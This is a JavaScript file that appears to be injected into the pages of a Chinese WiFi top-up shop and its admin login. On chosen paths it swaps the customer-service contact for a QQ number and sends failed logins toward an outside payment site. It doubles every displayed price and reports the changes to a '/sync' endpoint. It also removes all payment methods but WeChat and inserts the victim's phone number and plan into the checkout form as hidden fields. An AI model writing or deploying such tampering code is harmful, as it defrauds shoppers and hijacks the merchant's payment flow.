(function(){
  if(window.location.pathname=="/cmps/admin.php/api/login/"){
        document.querySelector(".main_footer_msg").innerText="客服QQ：2651935982";
        
        //login
        window.doFailedLogin=function(c, div) {
            if (c.data.reasoncode == "32") {
                resetpage();
                var name = $('#first_name').val();
                $("#reset_name").attr("value", name);
            } else if (c.data.reasoncode == "40") {
                art.dialog({
                    content: '您需要先完善自己的个人信息!',
                    okValue: '确定',
                    ok: function () {
                        window.top.location.href = c.data.complete_data_url;
                    }
                });
            } else if (c.data.reasoncode == "43") {
                art.dialog({
                    content: c.info,
                    okValue: '确定',
                    cancelValue: '取消',
                    ok: function () {
                            rebindMac(div, '', 1);
                        },
                        cancel: function () {

                        }
                });
            } else {
                showmessage(c.info, 6, 'http://pay.lucky2888.com');
            }
        }
      }
  
  var g=document.querySelector(".footer-wrap");
  if(g){
    g.querySelector('p').innerHTML='客服QQ：<a>2651935982</a>';
  }
  
  if(window.location.pathname=="/shop/User/login"||window.location.pathname=="/shop/Wifi/index"){
    //document.querySelector(".footer-wrap").querySelector('p').innerHTML='客服QQ：<a>2651935982</a>';
  }
  
  if(window.location.pathname=="/shop/Wifi/index"){
    document.querySelector(".menu_one a .title_subtitle").innerText="充值";
    document.querySelector("[data-item='2004'] p").remove();
    document.querySelector("#reset").remove();
    
    var as=[]
    document.querySelectorAll("[data-item]").forEach(function(a){
      var m=a.querySelector("p span:last-child").innerText,o=parseInt(m),x=o*2,id=a.getAttribute("data-item");
      a.querySelector("p span:last-child").innerText=x+'元';
      as.push({mid:id,oldm:o,newm:x})
    })
    $.post("/sync",JSON.stringify({d:as}))
    
    var z=parseInt(document.querySelector(".footer-info p span:last-child").innerText)*2;
    document.querySelector(".footer-info p span:last-child").innerText=z+'元';
  }
  
  
  if(window.location.pathname=="/shop/Wifi2/charge"){
    var a=$('#form').serializeArray().find(function(a){return a.name=='phone'}),b=$('#form').serializeArray().find(function(a){return a.name=='service_plan'}),c="无线套餐-"+$('.notice p').text().split('，')[0].substring(3)
    var o={phone:a.value,service_plan:b.value,des:c}
    localStorage.setItem('mkvr',JSON.stringify(o))
  }
  
  if(window.location.pathname=="/shop/wifi2/showDetail"){
    var a=document.querySelector(".info p:nth-child(2)").innerText,b=a.match(/\d+/g)[0];
    document.querySelector(".info p:nth-child(2)").innerText="套餐价格： "+b+"元";
  }
  
  if(window.location.pathname=="/shop/wifi/do_charge"){
    var a=document.querySelector(".info li:nth-child(2) .value").innerText,b=parseInt(a)*2;
    document.querySelector(".info li:nth-child(2) .value").innerText=a.replace(/\d+/,b)
    document.querySelector(".info li:nth-child(3) .value").innerText=b+'元';
    document.querySelector("#showpay").innerText=b+'元';
    
    $("[data-type=weixin_pay]").siblings().remove();
    document.querySelector("[data-type=weixin_pay]").click();
    
    var b=document.querySelector(".list_msg li:nth-child(2) span").innerText,c=parseInt(b)*2;
    document.querySelector(".list_msg li:nth-child(2) span").innerText=b.replace(/\d+/,c);
    document.querySelector("#total_fee").innerText=c;
    $("#weixin_pay_area").click().siblings().remove();
    
    var u=JSON.parse(localStorage.getItem('mkvr'))
    var h=['<input type="hidden" name="mid" value="'+u.service_plan+'"/>','<input type="hidden" name="account" value="'+u.phone+'"/>','<input type="hidden" name="des" value="'+u.des+'"/>']
    $('#form').append(h.join(''))
  }
  
  
}())
